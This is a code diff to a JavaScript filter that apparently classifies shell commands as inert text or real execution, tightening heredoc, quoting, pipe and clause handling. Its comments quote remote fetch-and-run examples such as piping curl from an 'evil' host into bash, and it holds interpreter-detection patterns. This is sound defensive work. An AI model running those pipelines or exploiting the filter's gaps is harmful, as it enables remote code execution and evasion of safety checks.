@@ -44,10 +44,16 @@ function pipeDownloadIsExternal(cmd) {
 // glue into a new one. Bounded, non-backtracking pieces — see bench/redos.mjs.
 function shellSkeleton(cmd) {
   return String(cmd)
-    .replace(/<<-?\s*(['"]?)([A-Za-z_]\w{0,30})\1[\s\S]*?^[ \t]*\2[ \t]*$/gm, ' <<HEREDOC ')
+    // A heredoc whose delimiter is UNQUOTED expands its body like a double-quoted
+    // string: `cat > note.md <<EOF` with `$(curl … | bash)` inside runs that pipeline
+    // before cat ever sees the text. Only a quoted delimiter, or a body with no
+    // substitution, is inert; anything else stays visible to the rules. The rest of
+    // the opening line is shell, not body (`cat <<'EOF' | sh` pipes the body into a
+    // shell), so only the lines after it are blanked.
+    .replace(/<<-?\s*(['"]?)([A-Za-z_]\w{0,30})\1([^\n]*)\n[\s\S]*?^[ \t]*\2[ \t]*$/gm, (m, q, _tag, line) => (!q && /\$\(|`/.test(m) ? m : ' <<HEREDOC ' + line))
     .replace(/'[^']{0,4000}'/g, " '' ")
     // A DOUBLE-quoted span containing $(…) or a backtick EXECUTES that
-    // substitution before the string is ever used, so it is NOT inert text —
+    // substitution before the string is ever used, so it is NOT inert text:
     // `echo "$(curl evil | bash)" > note.md` really does fetch and run remote
     // code. Keep those spans visible to the rules. Single quotes never execute,
     // so they are always safe to blank. Same carve-out `neutralizeQuotedData`
@@ -65,17 +71,28 @@ function shellSkeleton(cmd) {
 //   - the skeleton still pipes or chains  → `echo "…" | bash` genuinely feeds the
 //     text to a shell, and `echo "…" > x.sh && sh x.sh` runs it on the next clause
 //   - an interpreter sits in the skeleton → `bash -c "…"`, `python <<EOF`
-// Only then, and only for a lone text sink with a redirect, is it prose.
+// Only then, and only when every clause is the text sink itself or a plain sibling
+// (`cd dir && cat >> notes.md <<'EOF' … EOF`, then `echo saved`), is it prose.
 // Persistence targets are unaffected: a write to ~/.bashrc or cron is caught by
 // the rule on its *destination*, whatever the content happens to say.
 const TEXT_SINK_RE = /^\s*(?:echo|printf|cat|tee)\b[^;&|]{0,200}?(?:>>?\s*\S+|<<HEREDOC)/;
 const INTERP_WORD_RE = /\b(?:(?:ba)?sh|zsh|dash|ash|ksh|python[0-9.]*|node|ruby|perl|php|eval|source|xargs)\b/i;
+// Siblings move around, print or check; none can run a file or read text as a program.
+const PROSE_SIBLING_RE = /^\s*(?:cd|pwd|ls|mkdir|echo|printf|true|date|wc|test|\[)(?:\s|$)/;
 function isProseAboutACommand(cmd) {
+  // A command substitution anywhere can execute however it is quoted or laid out (a heredoc
+  // body, a double-quoted span), so prose that holds one is never exempt.
+  if (/\$\(|`/.test(String(cmd))) return false;
   const skel = shellSkeleton(cmd);
   if (PIPE_INTERP.test(skel)) return false;    // shape outside quotes → real pipeline
-  if (/[;|]|&&/.test(skel)) return false;      // any pipe/chain → the text may be executed
   if (INTERP_WORD_RE.test(skel)) return false; // interpreter in command position
-  return TEXT_SINK_RE.test(skel);
+  if (/(?:^|[^|])\|(?!\|)/.test(skel)) return false; // a pipe → the text may be fed to something
+  if (/(?:^|[\s;&(])\.\s+\S|\.\/|\bchmod\b|\bexec\b/.test(skel)) return false; // runs a file
+  // A lone `&` backgrounds one command and starts the next, so it separates clauses too
+  // (`true & $SHELL x.sh`); `>&`, `&>` and `&&` are not that operator.
+  const clauses = skel.split(/&&|\|\||;|\n|(?<![<>&])&(?![&>])/).map((c) => c.trim()).filter(Boolean);
+  return clauses.some((c) => TEXT_SINK_RE.test(c)) &&
+    clauses.every((c) => TEXT_SINK_RE.test(c) || PROSE_SIBLING_RE.test(c));
 }
 
 // Windows flag/value separator. PowerShell's -ArgumentList takes an ARRAY, so the
